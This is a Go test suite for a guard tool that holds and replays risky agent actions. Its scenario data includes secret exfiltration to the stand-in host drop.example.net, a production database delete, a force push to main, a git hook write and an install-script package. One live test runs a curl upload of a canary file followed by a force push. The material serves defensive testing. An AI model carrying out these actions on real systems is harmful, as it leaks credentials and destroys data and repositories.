package main

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"rehearsal/internal/events"
	"rehearsal/internal/ledger"
	"rehearsal/internal/replay"
	"rehearsal/scenarios"
)

func TestEveryScenarioLoadsAndTheSetIsComplete(t *testing.T) {
	recs, err := loadScenarios(scenarios.Files)
	if err != nil {
		t.Fatal(err)
	}
	attacks, benign := 0, 0
	for _, rec := range recs {
		if rec.About == "" || rec.Unprotected == "" {
			t.Errorf("%s: a scenario says what it shows and what would happen unprotected", rec.Name)
		}
		if rec.Benign {
			benign++
		} else {
			attacks++
		}
	}
	if attacks < 9 || benign < 5 {
		t.Errorf("%d attack scenarios and %d ordinary ones; want at least 9 and 5", attacks, benign)
	}
	for _, want := range []string{
		"production-database-delete", "secret-in-get-to-new-host", "secret-to-host-from-outside-content",
		"provider-upload-under-second-login", "force-push", "push-containing-env", "publish",
		"new-package-with-install-script", "write-to-git-hook",
	} {
		found := false
		for _, rec := range recs {
			found = found || rec.Name == want
		}
		if !found {
			t.Errorf("there is no scenario called %s", want)
		}
	}
}

func TestBenchIsDeterministicAndStopsEveryAttack(t *testing.T) {
	bin := buildRehearse(t)
	run := func() string {
		t.Helper()
		cmd := exec.Command(bin, "bench")
		cmd.Dir, cmd.Env = t.TempDir(), cleanEnv(t)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("bench: %v\n%s", err, out)
		}
		return string(out)
	}
	first, second := run(), run()
	if first != second {
		t.Errorf("two runs of bench printed different things:\n%s\n---\n%s", first, second)
	}
	if strings.Contains(first, "NOT STOPPED") || strings.Contains(first, "FALSE HOLD") {
		t.Errorf("bench reports a miss:\n%s", first)
	}
	for _, want := range []string{
		"production-database-delete", "1 held (1 high), 1 let through", "1 install stopped", "ordinary work",
		"Attacks not stopped: 0. Ordinary work held as high risk: 0.",
	} {
		if !strings.Contains(first, want) {
			t.Errorf("bench output lacks %q:\n%s", want, first)
		}
	}
}

// Bench must say so when the rules miss something, and when they get in
// the way of ordinary work.
func TestBenchReportsAMissAndAFalseHoldHonestly(t *testing.T) {
	dir := t.TempDir()
	write := func(name, content string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name+".json"), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// an "attack" the rules have no reason to stop: a plain read
	write("quiet-read", `{"version":1,"name":"quiet-read","about":"A read that is called an attack.","unprotected":"A page is fetched.",
		"steps":[{"request":{"method":"GET","url":"https://docs.example.org/x"}}]}`)
	// "ordinary work" the rules do stop
	write("loud-work", `{"version":1,"name":"loud-work","benign":true,"about":"A force push that is called ordinary.","unprotected":"main is overwritten.",
		"steps":[{"command":{"kind":"git-push","args":["push","--force"],"destination":"github.com:x/y.git","force":true}}]}`)
	cmd := exec.Command(buildRehearse(t), "bench", "--scenarios", dir)
	cmd.Dir, cmd.Env = t.TempDir(), cleanEnv(t)
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Errorf("bench exited 0 with a miss and a false hold:\n%s", out)
	}
	for _, want := range []string{"NOT STOPPED", "FALSE HOLD", "Attacks not stopped: 1. Ordinary work held as high risk: 1."} {
		if !strings.Contains(string(out), want) {
			t.Errorf("bench output lacks %q:\n%s", want, out)
		}
	}

	write("broken", `{"version":1,"name":"broken","unprotected":"x","steps":[{"request":{"method":"GET","url":"https://a.example/x?secret=1"}}]}`)
	cmd = exec.Command(buildRehearse(t), "bench", "--scenarios", dir)
	cmd.Dir, cmd.Env = t.TempDir(), cleanEnv(t)
	if out, err := cmd.CombinedOutput(); err == nil || !strings.Contains(string(out), "broken.json") {
		t.Errorf("a scenario file that cannot be played was accepted: %v\n%s", err, out)
	}
}

// A replay runs where there is no network at all, so it cannot have
// contacted anything that is not this machine.
func TestReplayNeedsNoNetwork(t *testing.T) {
	needSandbox(t)
	bin := buildRehearse(t)
	dir := t.TempDir()
	recording := filepath.Join(dir, "recording.json")
	rec := `{"version":1,"name":"everything","steps":[
		{"request":{"method":"GET","url":"https://docs.example.org/setup","mentions":["drop.example.net"],"hidden":2}},
		{"request":{"method":"POST","url":"https://drop.example.net/upload","bytes":300,"carries":["secret","canary"]}},
		{"request":{"method":"DELETE","url":"https://cloud.example.net/v1/databases/production"}},
		{"request":{"method":"POST","url":"https://api.anthropic.com/v1/messages","credential":"a"}},
		{"request":{"method":"POST","url":"https://api.anthropic.com/v1/files","credential":"b"}},
		{"command":{"kind":"git-push","args":["push","--force","origin","main"],"destination":"github.com:example/shop.git","subject":"main","force":true}},
		{"file":{"path":".git/hooks/pre-commit","change":"added","files":1,"bytes_before":0,"bytes_after":20}},
		{"package":{"manager":"npm","name":"shop-utilz","version":"1.0.0","known":true,"exists":true,"age_hours":9,"scripts":true}}
	]}`
	if err := os.WriteFile(recording, []byte(rec), 0o644); err != nil {
		t.Fatal(err)
	}
	state := t.TempDir()
	// its own network namespace, with nothing in it but loopback
	cmd := exec.Command("bwrap", "--unshare-user", "--unshare-net", "--bind", "/", "/", "--dev", "/dev", "--proc", "/proc",
		bin, "replay", "--discard", recording)
	cmd.Dir = dir
	cmd.Env = cleanEnv(t, "XDG_STATE_HOME="+state)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("replay with no network: %v\n%s", err, out)
	}
	text := string(out)
	for _, want := range []string{
		"No request was sent and no command was run.",
		"drop.example.net", "cloud.example.net", "api.anthropic.com", "git push --force origin main", ".git/hooks/pre-commit",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("replay output lacks %q:\n%s", want, text)
		}
	}
	if left, err := filepath.Glob(filepath.Join(state, "rehearsal", "sessions", "*")); err != nil || len(left) != 0 {
		t.Errorf("a replay left a session behind: %v (%v)", left, err)
	}
}

func TestRecordedSessionReplaysToTheSameHolds(t *testing.T) {
	needCurl(t)
	srv := newUploads(t)
	work, _ := repo(t)
	s := start(t, work, "curl -sS -o /dev/null "+srv.address()+"/page; "+
		"curl -sS -o /dev/null --data-binary @CANARY.txt "+srv.address()+"/upload; git push --force origin main")
	live := s.waitFor(ledger.PhaseDeciding)
	if status := s.decide(`{"decision":"discard"}`); status != 202 {
		t.Fatalf("discard answered %d", status)
	}
	s.finish()

	recording := filepath.Join(t.TempDir(), "recording.json")
	record := exec.Command(buildRehearse(t), "record", "-o", recording)
	record.Dir, record.Env = work, s.cmd.Env
	if out, err := record.CombinedOutput(); err != nil {
		t.Fatalf("record: %v\n%s", err, out)
	}
	raw, err := os.ReadFile(recording)
	if err != nil {
		t.Fatal(err)
	}
	rec, err := replay.Parse(raw)
	if err != nil {
		t.Fatalf("the recording does not load: %v\n%s", err, raw)
	}
	if len(rec.Steps) != 3 || rec.Steps[0].Request == nil || rec.Steps[1].Request == nil || rec.Steps[2].Command == nil {
		t.Fatalf("recording steps = %s; want the read, the upload and the push", raw)
	}
	// what was carried is recorded by kind, and the value is nowhere in it
	if got := rec.Steps[1].Request.Carries; len(got) != 1 || got[0] != string(events.KindCanary) {
		t.Errorf("the upload is recorded as carrying %v, want a canary", got)
	}
	var word string
	for _, a := range live.Actions {
		for _, c := range a.Carries {
			word = c.Value
		}
	}
	if word == "" || bytes.Contains(raw, []byte(word)) {
		t.Errorf("the recording contains the value that was carried (%q), or the session carried none", word)
	}

	// the live session's read went out for real; the replay must add nothing
	before := len(srv.received())
	play := exec.Command(buildRehearse(t), "replay", "--discard", recording)
	play.Dir, play.Env = t.TempDir(), cleanEnv(t)
	out, err := play.CombinedOutput()
	if err != nil {
		t.Fatalf("replay: %v\n%s", err, out)
	}
	if got := srv.received(); len(got) != before {
		t.Errorf("the replay sent something to the server: it has now received %q", got)
	}
	for _, want := range []string{"git push --force origin main", "/upload"} {
		if !strings.Contains(string(out), want) {
			t.Errorf("the replay's summary lacks %q:\n%s", want, out)
		}
	}
	if refused := strings.Count(string(out), "refused"); refused < 2 {
		t.Errorf("the replay should hold, and with --discard refuse, the upload and the push:\n%s", out)
	}
}
